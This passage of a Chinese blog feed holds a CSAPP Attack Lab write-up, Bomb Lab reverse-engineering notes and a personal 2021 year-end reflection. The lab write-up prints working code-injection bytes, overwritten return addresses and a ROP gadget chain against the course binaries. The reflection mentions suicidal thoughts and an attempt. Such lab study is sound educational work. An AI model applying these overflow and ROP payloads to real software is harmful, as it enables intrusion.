90 </span><br><span class="line">90 90 90 90 90 90 90 90 </span><br><span class="line">78 dc 61 55 00 00 00 00</span><br></pre></td></tr></table></figure><p>这里 90 是 <code>nop</code>, 用于填充的，不过似乎不需要?<br />返回地址也直接覆盖为 <code>0x5561dc78</code>，缓冲区开始的地方，也就是我们注入代码开始的地方<br />还是要注意小端法。</p><p>(用时最短的一个，第一个做完第二个就轻车熟路了)</p><h2 id="phase-0x3">Phase 0x3</h2><p>查看 <code>attack.pdf</code> 的要求，发现主要是把 cookie十六进制对应的字符串 ( <span class="math inline">\(without\ a\ leading\\)</span> <code>0x</code> ), 然后用 <code>hexmatch</code>比较是否相等。</p><p>但是这个 <code>hexmatch</code> 写得太折磨了。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">hexmatch</span><span class="params">(<span class="type">unsigned</span> val, <span class="type">char</span> * sval)</span> &#123;</span><br><span class="line">    <span class="type">char</span> cbuf[<span class="number">110</span>];</span><br><span class="line">    <span class="type">char</span> *s = cbuf + random() % <span class="number">100</span>;</span><br><span class="line">    <span class="built_in">sprintf</span>(s, <span class="string">&quot;%.8x&quot;</span>, sval);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">strncmp</span>(sval, s, <span class="number">9</span>) == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这个 110 大小的缓冲区 <code>cbuf</code> 会把我们 inject code 和cookie string 所在的缓冲区弄得一团糟，而且 random的存在导致我们不能直接填充这个地址。</p><p>解决方案有点取巧。在 gdb 中打断点，分别在 <code>touch3()</code>起始和<code>hexmatch()</code> 后检查缓冲区 <code>x/100bx 0x556178</code>，找到前后没变并且<del>看起来</del>没什么用的区域填充 cookie。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">48 c7 c7 b3 dc 61 55 90 </span><br><span class="line">68 fa 18 40 00 90 90 90 </span><br><span class="line">c3 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 </span><br><span class="line">90 90 90 90 90 90 90 90 </span><br><span class="line">78 dc 61 55 00 00 00 00 </span><br><span class="line">90 90 90 90 90 90 90 90</span><br><span class="line">90 90 90 35 39 62 39 39 </span><br><span class="line">37 66 61 00 90 90 90 90 </span><br></pre></td></tr></table></figure><p>这里 <code>0x5561dcb3</code> 及之后是 cookie。 (注意结尾<code>\0</code> )</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.. .. .. 35 39 62 39 39 </span><br><span class="line">37 66 61 00 .. .. .. ..</span><br></pre></td></tr></table></figure><p>完美通过。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">amiriox@makinohara ‹ master ●● › : ~/csapplab/attacklab</span><br><span class="line">[] ξ ./hex2raw &lt; inraw.txt &gt; in.txt &amp;&amp; ./ctarget -q &lt; in.txt</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;59b997fa&quot;)</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Would have posted the following:</span><br><span class="line">    user id    bovik</span><br><span class="line">    course    15213-f15</span><br><span class="line">    lab    attacklab</span><br><span class="line">    result    1:PASS:0xffffffff:ctarget:3:48 C7 C7 B3 DC 61 55 90 68 FA 18 40 00 90 90 90 C3 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 90 78 DC 61 55 00 00 00 00 90 90 90 90 90 90 90 90 90 90 90 35 39 62 39 39 37 66 61 00 90 90 90 90 </span><br></pre></td></tr></table></figure><h2 id="phase-0x4">Phase 0x4</h2><p><code>attack.pdf</code> 中介绍了关于 <code>ROP</code> 的相关知识.</p><p>因此推测思路是，通过缓冲区溢出攻击在栈顶放 cookie,<br />通过 <code>popq %rdi</code> 恢复到 %rdi 寄存器以传参,<br />然后 <code>call 0x4017ec</code> (<code>touch2()</code>).<br />但是 gadgets farm 中没有出现 call 的 gadget, 所以只能用 <code>ret</code>转移到 <code>touch2()</code>,<br />这样就要保证 <code>popq</code> 弹栈恢复 %rdi 之后的栈顶是<code>0x4017ec</code>.</p><ul><li><code>popq %rdi</code> 的机器码是 <code>5f</code></li><li><code>ret</code> 的机器码是 <code>c3</code></li><li>需要用 <code>nop</code> 即 <code>90</code> 对齐</li></ul><p>有两个问题需要考虑: 1. 前几个 phase是上周做的了，这几天一直在复习高数，所以栈的布局还得再研究一下 2.怎么执行到第一个 gadget ? 第一个 gadget <code>ret</code> 后，会通过 ret弹出栈顶的地址并跳转到那个地址实现链式调用.</p><p>solve: 1. 返回地址在栈上的位置是 <code>0x5561dca0</code> =<code>0x5561dc78</code> + <code>0x28</code> 2. 第一个 gadget 大概直接在<code>0x5561dca0</code> 写地址就行，栈保护是没事的因为 gadget不在栈内存，但是地址随机化不好说。</p><p>紧接着发现 gadget farm 里没有 <code>5f</code>, 感觉很不解,这么精妙的做法, 这 lab 不这么解说明教授水平不行啊。<br /><code>attacklab.pdf</code> 说只需要两条指令就能做 phase 4, 但是调用touch2 的 ret 肯定需要一条， 剩下的除了 <code>popq</code>还能是什么?</p><p>谔谔, 卡了半天决定去看 <ahref="https://arthals.ink/blog/attack-lab">Arthals在北大计算机系统导论（ICS）课程中所做的详尽笔记</a><br />这个 lab 是北京大学改过的(甚至还买了 csapp 的版权, 9爷吃的就是好啊)。<br />然后发现他们也没给 <code>5f</code>, 那我估计就是先 <code>pop</code> 再<code>mov</code>, ugly.</p><p>重新审阅 <code>rtarget.asm</code> 中 <code>start_farm</code> 到<code>mid_farm</code> 之间的机器码, 发现有 <code>58</code> 即<code>popq %rax</code><br />则我们需要</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">popq    %rax;       ret   # 58 90 c3 at 0x4019cc</span><br><span class="line">movl/q  %rax, %rdi; ret   # 48 89 c7 at 0x4019a2</span><br></pre></td></tr></table></figure><p>填充 <code>inraw.txt</code>, 当然传递给 <code>hex2raw</code>的是不能有注释的.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">cc 19 40 00 00 00 00 00 # 缓冲区溢出的返回地址, 这里 ROP 直接进第一个 gadget = popq %rax; ret</span><br><span class="line">fa 97 b9 59 00 00 00 00 # cookie</span><br><span class="line">a2 19 40 00 00 00 00 00 # movq %rax, %rdi; ret</span><br><span class="line">ec 17 40 00 00 00 00 00 # touch2() 的地址</span><br></pre></td></tr></table></figure><p>栈中的情况和具体执行流程:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">+---------------------------+ 高地址</span><br><span class="line">| touch2() 的地址           | &lt;- 由第二个 gadget movq ret 而来.</span><br><span class="line">| movq %rax, %rdi; ret      | &lt;- 由第一个 gadget popq ret 而来, 所谓 gadget 的链式调用。</span><br><span class="line">+---------------------------+</span><br><span class="line">| cookie,被popq弹出,放入rax | &lt;- 缓冲区溢出时地址累加, 但栈向低地址扩张 </span><br><span class="line">| popq %rax; ret            | &lt;- 函数返回时跳转的位置, 弹出 cookie 后栈顶是 movq， 于是 ret 到那里</span><br><span class="line">+---------------------------+</span><br><span class="line">| buffer[40]                | &lt;- callee 的栈帧</span><br><span class="line">| buffer[39]                |</span><br><span class="line">| ... 我们填了40 字节的0    | &lt;- 缓冲区</span><br><span class="line">| buffer[1]                 |</span><br><span class="line">| buffer[0]                 | &lt;- 缓冲区起始           0x5561dc78</span><br><span class="line">+---------------------------+ 低地址</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><del>其实这里直接过了我不太理解的, 为什么不需要保持 rsp 16位对齐啊?</del></p><p>这里没有发生段错误而是直接栈对齐了是因为恰好两次 ret, 每次 +8,<br />然后调用 touch2 时满足了 rsp 16 位对齐。</p><p>说是普通的运算不需要一直保持 <code>rsp % 16 == 0</code>,只需要在函数调用时满足就可以了, 具体还有待后续学习.</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">amiriox@makinohara ‹ master ●● › : ~/csapplab/attacklab</span><br><span class="line">[1] ξ ./hex2raw &lt; inraw.txt &gt; in.txt &amp;&amp; ./rtarget -q &lt; in.txt</span><br><span class="line">Cookie: 0x59b997fa</span><br><span class="line">Type string:Misfire: You called touch2(0x3928c8e0)</span><br><span class="line">Ouch!: You caused a segmentation fault!</span><br><span class="line">Better luck next time</span><br><span class="line">FAIL: Would have posted the following:</span><br><span class="line">user idbovik</span><br><span class="line">course15213-f15</span><br><span class="line">labattacklab</span><br><span class="line">result1:FAIL:0xffffffff:rtarget:0:9E 19 40 00 00 00 00 00 CC 19 40 00 00 00 00 00 FA 97 B9 59 00 00 00 00 A2 19 40 00 00 00 00 00 9E 19 40 00 00 00 00 00 EC 17 40 00 00 00 00 00 </span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;phase-0x1&quot;&gt;Phase 0x1&lt;/h2&gt;
&lt;p&gt;一个练手的，要求通过缓冲区栈溢出攻击来调用 touch1&lt;/p&gt;
&lt;p&gt;&lt;code&gt;gdb ctarget&lt;/code&gt; 然后 &lt;code&gt;set args -q&lt;/code&gt;
防止与不存在的服务器通信（&lt;code&gt;run -q&lt;/code&gt; 也可以)
&lt;code&gt;b Gets&lt;/code&gt; &lt;code&gt;run -q&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;看一下栈信息:&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;────────────────────────[ STACK ]────────────────────────&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;00:0000│ rsp 0x5561dc70 —▸ 0x4017b4 (getbuf+12) ◂— movl $1, %eax&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;01:0008│ rdi 0x5561dc78 ◂— 0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;... ↓        3 skipped&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;05:0028│     0x5561dc98 —▸ 0x55586000 ◂— 0&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;06:0030│     0x5561dca0 —▸ 0x401976 (test+14) ◂— movl %eax, %edx&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;07:0038│     0x5561dca8 —▸ 0x55685fe8 —▸ 0x402fa5 ◂— pushq $0x3a6971 /* &amp;#x27;hqi:&amp;#x27; */&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;</summary>
    
    
    
    <category term="组成原理" scheme="https://amiriox.github.io/categories/%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="计算机科学" scheme="https://amiriox.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"/>
    
    <category term="CSAPP/cmu15213" scheme="https://amiriox.github.io/tags/CSAPP-cmu15213/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP Bomb Lab 达成</title>
    <link href="https://amiriox.github.io/2024/12/14/CSAPP-Lab-Bomb/"/>
    <id>https://amiriox.github.io/2024/12/14/CSAPP-Lab-Bomb/</id>
    <published>2024-12-14T11:58:00.000Z</published>
    <updated>2025-02-13T16:11:04.181Z</updated>
    
    <content type="html"><![CDATA[<hr /><p>Border relations with Canada have never been better. 直接读phase_1 的$rdi.</p><hr /><p>1 2 4 8 16 32 利用断点跳到 read_six_number 后, 发现核心代码 add $eax$eax</p><hr /><p>5 206 rsp+8 rsp+12分别是你输入的两个数, int四字节. 发现一堆, movjmp里只有第五个的差能整除8并且mov的值是206(最后几行是核心代码 cmp0xc(%rsp), %eax</p><hr /><p>7 0 打断点到 phase_4(), 阅读汇编得: 输入两个数, 输入的第一个数 &lt;=14 rdi: 输入的第一个数 rsi: 0 rdx: 14 func4(x1, 0, 14, 0);</p><p>进入 func4() 继续阅读汇编, 顺便翻译一下: def func4(rdi, rsi, rdx,rcx): rax = rdx - rsi rcx = rax shr 31 rax += rcx rax sar= 1 rcx = rax +rsi</p><pre><code>// summary:// rax = ((rdx - rsi) + (rdx - rsi) shr 31) sar 1// rcx = ((rdx - rsi) + (rdx - rsi) shr 31) sar 1 + rsiif (rdi &lt;= rcx)     // 跳到ff2    if(rdi &gt;= rcx)      return 0;    else        rax = func4(rdi, rsi = rcx + 1, rdx, rcx)        return (rax = 2 * rax + 1)else     rax = fun4(rdi, rsi, rdx = rcx - 1, rcx)   return 2 * rax</code></pre><p>if(func4() == 0 &amp;&amp; ($rsp + 8) == 0) { ok } else bomb!</p><p>优化后得: f (x1, $2, $3): x1 &lt;= $2 + ($3 - $2)/2 x1 == $2 + ($3 -$2)/2: return 0 else: return 2 * f(x1, ($3 - $2)/2 + 1, $3) + 1 else:return 2 * f(x1, $2, $2 + ($3 - $2)/2 - 1) 10 0 14 return 2 * f(10, 0,6)</p><p>然后发现其实令 x1 = $2 + ($3 - $2) / 2 即 0 + (14 - 2) / 2 = 7就行了</p><hr /><p>y_^EFG 字符串长度为6 rbx = rdi(input) rax = 0 while(rax &lt; 6) { rdx= (<em>(rbx + rax) &amp; 0xf) + 0x4024b0 // input[i] &amp; 1111 +0x4024b0 </em>(rsp + 10 + rax) = rdx // input[i] = rax += 1 // i++; }*(rsp + 16) = 0 // ‘\0’ rdi = rsp + 10 // input after processing rsi =$0x40245e // “flyers” strings_not_equal(rdi, rsi)</p><pre><code>       11</code></pre><p>maduiersnfotvbyl 0123456789 10</p><p>@: 0x4024b0 f: 0x4024b9 +9 0x0009 l: 0x4024bf +15 0x000f y: 0x4024be+14 0x000e e: 0x4024b5 +5 0x0005 r: 0x4024b6 +6 0x0006 s: 0x4024b7 +70x0007 +dd</p><p>input[i] ASCII 取后四位 + 0x4024b0令一个字符c的ASCII的十六进制后四位分别为以上的 %rdx 64位, %edx 32位, $dl8位 p /x $dl 如输出 0x61, 6是四位, 1也是四位, 因为十六进制最大f(15,1111) 所以只要ASCII 是 <code>0x*9</code>, <code>0x*f</code>,<code>0x*e</code>, <code>0x*5</code>, <code>0x*6</code>,<code>0x*7</code> 的字符就可以了 这里随便选的y_^EFG</p><hr /><p>r13 = &lt;+8&gt;rsp (init - 50) rsi = &lt;+8&gt;rsp</p><p>下面是废的, 我有空再补.</p><p>这个难度很大. 总之是先查6个数都&lt;=6 且不能重复</p><p>然后将每个数 x 变为 7 - x</p><p>然后根据新的xi安排在0x6032d0处的一个链表, 安排完要求顺序值递减查看一下这个链表: (gdb) x/24w 0x6032d0 0x6032d0 <node1>: 332 1 6304480 00x6032e0 <node2>: 168 2 6304496 0 0x6032f0 <node3>: 924 3 6304512 00x603300 <node4>: 691 4 6304528 0 0x603310 <node5>: 477 5 6304544 00x603320 <node6>: 443 6 0 0</p><p>递减的话就是 3 4 5 6 1 2 根据7映射回去就是 4 3 2 1 6 5</p><p>读入6个数字(rsp也变了)</p><p>r14 = &lt;+23&gt;rsp r12d = 0 rbp = r13 rax = <em>r13 - 1 if(rax&gt;= 5) { //跳到52 r12d += 1 if(r12d == 6) { // 跳到 95 rsi = </em>(rsp+ 0x18) rax = r14 rcx = 0x7</p><p>&lt;+118&gt; while(rax != rsi) { &lt;+108&gt; rdx = rcx rdx -=<em>rax </em>rax = rdx rax += 0x4 }</p><p>&lt;+123&gt; rsi = 0</p><p>&lt;+166&gt; while(rcx &gt;= 1) { &lt;+163&gt; rcx = <em>(rsp + rsi)while(rcx &gt;= 0x1) { // 跳到&lt;+143&gt; &lt;+143&gt; rdx = $0x6032d0&lt;+148&gt; </em>(0x20 + rsp + 2 * rsi) = rdx &lt;+153&gt; rsi += 0x4if(rsi = 0x18) { // 跳到183 &lt;+183&gt; codes here (201)&lt;+212&gt;<br />while(rax != rsi) {</p><pre><code>            &#125;else &#123;            &#125;            if(rax == rsi) &#123;                 //跳到222</code></pre><p>&lt;+222&gt;<br />codes here }else { &lt;+217&gt; codes here &lt;+220&gt; 直接跳201了,我不理解 } }else { &lt;+163&gt; rcx = *(rsp + rsi) } } }</p><pre><code>    rax = 0x1    rdx = 0x6032d0    // 跳到 + 130</code></pre><p>&lt;+130&gt; do { rdx = *(rdx + 0x8) rax += 1 }while(rax != rcx); //跳到&lt;+148&gt; goto &lt;+148&gt;: goto &lt;+143&gt;:</p><pre><code>&#125;</code></pre><p>}else bomb!</p>]]></content>
    
    
    <summary type="html">&lt;hr&gt;
&lt;p&gt;Border relations with Canada have never been better. 直接读phase_1 的
$rdi.&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;1 2 4 8 16 32 利用断点跳到 read_six_number 后, 发现核心代码 add $eax
$eax&lt;/p&gt;
&lt;hr&gt;</summary>
    
    
    
    <category term="组成原理" scheme="https://amiriox.github.io/categories/%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
    
    <category term="计算机科学" scheme="https://amiriox.github.io/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/"/>
    
    <category term="CSAPP/cmu15213" scheme="https://amiriox.github.io/tags/CSAPP-cmu15213/"/>
    
  </entry>
  
  <entry>
    <title>直面灾厄 -- 2021 年终总结</title>
    <link href="https://amiriox.github.io/2022/01/28/2021_face_up_to_calamities/"/>
    <id>https://amiriox.github.io/2022/01/28/2021_face_up_to_calamities/</id>
    <published>2022-01-27T17:05:00.000Z</published>
    <updated>2025-02-13T16:21:51.910Z</updated>
    
    <content type="html"><![CDATA[<h1 id="直面灾厄-2021-年终总结">“直面灾厄” —— 2021 年终总结。</h1><p>本篇系笔者 2021年年终总结 / 初中毕业总结 / 高一(上)学年生活总结。</p><h2 id="part-1.-概括">Part 1. 概括。</h2><p>这一年实在是多灾多难的一年。年初的时候其实还蛮好的（<del>还记得大年初一学对顶堆</del>）然而接下来经历了中考考前的四个月+考后假期一个月+高一网课一个月+高一线下课四个月彻底毁了我整个精神状态（或者说引爆了埋在深处的雷罢）</p><p>中考考前四个月，我做了大概是目前最后悔的一个决定，我退役了OI。说是为了学习，其实也只是跟风 包括满足自己虚荣心之类的。那个时候精神状态就在恶化（尽管现在看来当时算很不错的），于是还是在颓了四个月之后，甚至还碰运气考上全县前50（大概是35的样子）进了我最恐惧的实验班。</p><p>本想着有两个月假期，紧接着 8月15号开学8月2号开学的消息接踵而至，假期被缩短到了一个月，计划瞬间被打乱。结果就是，那个假期只有前几天是安安稳稳的。往后的日子，越来越难过。哪成想 这只是开始。</p><p>高一开学后，刚上两天军训就来了疫情。正巧明日方舟夏活，于是上网课写作业，下课打活动，日子也算有滋有味。……但闲暇时间再细细品味这杯醇香的酒，是不是少了什么？</p><p>然后是目前为止我人生中最难度过的四个月。我从未想过我要面对这些，曾经的思考与挣扎，”失败“，与当时的状况相比几乎是无比快乐的。我在那个班级莫名地难受，感到恐惧，感到前所未有的危机感（但并不是文化课上的），我找不出原因（不如说“我至今找不出原因”，因为当时我甚至没有分析问题甚至喘息的机会）。暂时失明，恶心呕吐，感到很多不存在的目光注视自己甚至有生理上感到针扎的痛苦。最致命地，OI上的失意和现实上的重重打击让当时的我选择直接退役，从此告别OI，500多天的OI生涯就此结束。这些夹杂在一起的混乱和悲凉让我无数次想到自杀，甚至付诸实践。幸运的是，祖祖辈辈遗传下来的求生欲和我对OI的执念（毁灭我的亦施舍于我）在死亡线上拉回了我。我开始尝试借助医学的力量。顺便也是在看了一年半的心理医生的建议下，我去了哈医大一院（本想长假去因为不想请假，但心理医生建议我早去）。最后诊断是双相情感障碍，中度焦虑中度抑郁，强迫思维，较严重的心理问题躯体化（其实查出抑郁焦虑啥的很正常，这年头大街上随便拽一个也能查出轻度，至少我是这么认为的）。可能也是走投无路，我也只能相信医生了（话说我哪来的勇气否定医生啊喂）。后来虽然有所稳定，但生活只不过是从持续性的痛苦转移到了一种迷乱之中。如此，内心里的我在一篇黑雾里像个醉汉一样跌跌撞撞，现实里的我完全没有自己意识地跟着整个实验班一起卷文化课，每天在没有自我的生活里拼杀。这样下来，总算熬过了四个月的课程，迎来了寒假。</p><p>然后是放假到现在。不如来活跃下思维，想一想假如你经历了上述场景放假这些天会怎么样？</p><p>至于我嘛…毫无疑问地我颓了。如你所见作业一点没写，OI搞了一点也是逼着自己强行搞的。颓废过程中我意识到我没法掌控自己的身体和精神了，但是这可能是高中三年唯一一个超过一个月的假期了，必须好好珍惜。于是我只好采取些折中的暂时性战略，比如抱着玩而不是学东西的心态搞OI，也不追求学到点什么。虽然效率极低，但起码是在向前走的。</p><figure><img src="https://s4.ax1x.com/2022/01/28/7vla0H.png" alt="7vla0H.png" /><figcaption aria-hidden="true">7vla0H.png</figcaption></figure><p>必须有所改变。根本上的原因很难找到，但起码要有一些措施来改变现状。展望未来的事情写在最后，这是总结文。</p><h2 id="part-2.-年终总结之2021经历">Part 2. 年终总结之2021经历。</h2><p>相对于去年（可以看我去年的总结），两个学期都在文化课里的我显然没什么好写的东西。</p><p>不过有一个最大的灾厄。我错过了2021年的<code>CSP</code>。因为这天杀的疫情。<code>疫情，騲</code></p><p>去年一整年的危机感大多来源于对于自己实力的怀疑。事实上我觉得这是自学OI的OIer最容易遇到也是最难克服的心理问题。但多亏（？或者说不幸的是）我的强迫思维，我总觉得我起码要拿个CSPpj1=的奖才算底线。然而2020年因为T1忘删<code>freopen</code>注释痛失100分拿了个2=，那一年我的内心就越来越焦虑，加上月赛经常Div2.爆零，出了偶尔ABC的123题能让我找回点信心，我的自信几乎都建立在空中楼阁上。</p><p>错过CSP那阵子正是我发病最严重的日子，因为发病的事甚至顾不上OI，反而是减轻了些痛苦。但2022年的CSP，我决不可能错过了，这是我高中生涯的最后一次机会。</p><p>这一年OI始终是穿插着我生活的一条暗线，而明线就是一路上的鲜血，那在我埋下头消化自己的痛苦时感受到若隐若无紧紧抓着我肺部的怪物。但在这一篇乌烟瘴气之中，仿佛有微光乍现。非常感谢我的朋友（包括@西卡洛斯）这一年对我的支持，让我在极端难受的时候有一个倾诉的人，非常庆幸有人能理解自己非常感谢明日方舟以及罗德岛的各位在这一年对我精神上的慰藉，让我在失去自我的时候让我不至于被世界所缚。</p><p>以及十分感谢学校饭堂的没有一点肉的酸菜猪肉馅饺子，给了我在情绪暴躁的时候骂街的对象。而且还有人和我一起骂，很爽。很解气。</p><p>好的方面实在没什么好写的了，今年实在是白过的一年。</p><ul><li>入坑了penbeat 当然现在也荒废了</li><li>入坑了phigros 当然现在很少玩了</li><li>比较重要的一件事是，当时给自己一个定心的方案就是“每晚固定至少30min看洛谷网校的秋令营，这倒是有一定成效</li><li>中考考体育的时候一千米长跑当着几百人面大喊为斯卡蒂线上献上心脏，跑了人生中唯一一次一千米满分。</li><li>至于算法，<del>好像一个没学</del>复习巩固了很多东西，对之前似懂非懂的东西逐渐完善，也了解了一些思想</li><li>大大提升了抗压能力。桥洞下盖小被，啊对对对</li></ul><h2 id="part-3.-年终总结之今年的优缺点">Part 3.年终总结之今年的优缺点</h2><ul><li><p>优点</p><ul><li>除了几次极端情况，大多数无论有多痛苦，我都是还会分析现状，设计计划，拼命尽力执行。精神可嘉。<del>意思就是行动力太差</del></li><li>总体上保持进步状态，虽然现实上没有在进步的趋势。<del>其实还是说行动力太差</del></li><li>思考问题更加有逻辑，同时更灵活，能更一阵见血地看到问题本质，在遇到一些问题的时候起了不少作用。</li><li>文化课上写课外题还不错（~<sub>唯一一次把自己买的课外题写完超80%以上的，还是六科一科1</sub>2本~~）</li><li>过的一塌糊涂，实在想不出怎么夸自己了。</li></ul></li><li><p>缺点</p><ul><li>行动力实在太差。用疾病给自己找借口未免过于懦弱，其实还是精神上不够坚韧。</li><li>太颓废，太依赖学校环境学文化课，回到家一塌糊涂啥也不想干，生物钟完全混乱导致上课精神不好（影响最大的其实是生物，其他科尤其是英语多半还是靠课下的贡献）</li><li>攀比心太强</li></ul></li><li><p>总结</p><ul><li><p>令我感到十分意外，这次缺点写的比优点少，这大概不是我的风格罢。</p></li><li><p>对于行动力差这一2022年第一大敌人，其实总结下来就是（1没有建立正反馈）（2对于时间的焦虑起了反作用）（3无法长时间专注）（4没有做到断舍离）当然要分析问题来讲，疾病上的问题也还是不能忽略。</p></li><li><p>对于太颓废其实和上面是一样的，但是回到家（大概<code>9:50</code>）没法学习这件事<strong>在继承了上面原因的基础上</strong>，还有一点就是学校和家里的环境差异。不如思考，在学校我的学习动机是什么？内卷的氛围焦虑？其实更在于一个“这是个底线绝对不能跨过去”。这个底线就是“起码在学校一定要珍惜时间”，因为这些事情搞不完早晚也要搞，以后反而更麻烦，不如现在搞了给以后省事。可以看出本来也不是什么正向的动机。唉，毕竟学文化课嘛。但还是要想着好好约束自己。实在不行以后只能把家长请来靠外力约束自己。</p></li><li><p>至于OI我相信我是不需要外力约束的（多亏了去年那阵子暂时退役调整对于OI的心态和看法摆正，详见博客另外文章）所以就是上述三个原因了。所以第一要建立正反馈（同时在峰值期间立刻下线到终值），另外就是要多注意一下更长时间连续的OI正反馈（大概在4h-5h单位左右但上不封顶）；第二可以多利用番茄时钟，当然我知道不能解决完全问题，我迟早要思考一下这个问题怎么彻底根治的；第三就是断舍离咯，非常简单。不过隐隐地我感觉到有更深层次的原因在里面：大概就是因为没有正反馈，不想搞学习，然后无法长时间专注让我没法做成任何事情，然后只能闲着；然后闲着时对时间的焦虑让我不得不做些什么，所以只能颓废。逻辑大概是这样子的，一环套一环，解铃还须寄铃人，对，我是歌姬吧</p></li><li><p>攀比心这事是我在上学期间一次分析道的。当时大概是这样子的：我写了一些课外题感觉很有成就感，但突然感觉没有OI心理空空的，正反馈瞬间消失了（其实大概是内啡肽的调节作用，让情绪和生活状态相符合，所以说良好的心理状态是生理情绪和生活状态相适应，不然治疗抑郁症只需要打多巴胺和抗多巴胺耐受的药物就好了www）。后来这个问题是这么被分析的：这是因为我把OI当成生活中的主要部分了——那为什么文化课不能是？——因为我不喜欢文化课——但你喜欢数学——（意识到别的OIer正在搞OI而你没在搞的焦虑）——难道我学OI就是为了和别人争个高下？（我一自学的咋说也比不上别人啊…）——于是问题牵引到了“我为什么学OI这个问题上”。虽然这种问题很麻烦并且让人感觉很有一种不懂装懂的中二青年的感觉，但我当时还是犹豫把这种事情当成单纯的强迫思维症状处理还是更深入地思考人生意义（去年心理医生跟我提过存在主义，知乎上看到过虚无主义，然后就开始了自己的瞎jb思考）后来直接开摆。反正放假了，先歇会。嗯当然文化课上也有攀比，不过比不过，难受哎。</p></li><li><p>大概是这些未来计划部分要针对这些进行调整和优化。期待新的一年有新的生活。不过就普遍理性而言，走不出这个高中我的精神就一天无法解放。我是没法融入这里的，一中的一切都让我恶心。</p></li></ul></li></ul><p><code>TODO</code> 我是谁来着？ <code>2022年1月28日</code>凌晨<code>1:05</code> 请把书桌上绿色笔记本内容摘抄部分到下面。</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;直面灾厄-2021-年终总结&quot;&gt;“直面灾厄” —— 2021 年终总结。&lt;/h1&gt;
&lt;p&gt;本篇系笔者 2021年年终总结 / 初中毕业总结 / 高一(上)学年生活总结。&lt;/p&gt;
